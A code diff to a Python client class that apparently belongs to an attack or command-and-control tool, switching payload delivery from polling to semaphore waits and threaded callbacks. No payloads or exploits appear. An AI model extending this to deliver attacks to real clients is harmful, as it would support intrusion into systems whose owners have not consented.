@@ -1,6 +1,9 @@
 import json
 from queue import Queue
 import time
+import threading 
+import  _thread
+
 class Client:
     def __init__(self,clientid,project,clientinfo) -> None:
         self.clientid=clientid
@@ -11,6 +14,7 @@ class Client:
         self.taskqueue=Queue()
         self.stopattack=False
         self.taskresult={}
+        self.tasksemaphore={}
 
     def get_latest_task(self):
         try:
@@ -23,15 +27,26 @@ class Client:
         self.taskqueue=Queue()
 
     
-    def send_payload(self,moduleobj,sync=1):
+    def send_payload(self,moduleobj,callback=None):
         if self.stopattack:
             raise Exception("Attack on this client should be stopped")
         payload=moduleobj.payload
         payload.set_client(self)
-        self.taskqueue.put(payload)
         taskid=payload.taskid
-        while sync:
-            time.sleep(1)
-            if  taskid in self.taskresult:
-                return self.taskresult[taskid]
+        semaphore=threading.Semaphore(0)
+        self.tasksemaphore[taskid]=semaphore
+        self.taskqueue.put(payload)
+        if not callback:
+            semaphore.acquire()
+            return self.taskresult[taskid] 
+        elif callable(callback):
+            def thread_callback():
+                semaphore.acquire()
+                callback(self,self.taskresult[taskid] ) #callback(client,)
+            _thread.start_new_thread( thread_callback, tuple())
         return taskid
+    
+    def get_taskresult(self,taskid):
+        if taskid in self.taskresult:
+            return self.taskresult[taskid] 
+        return None
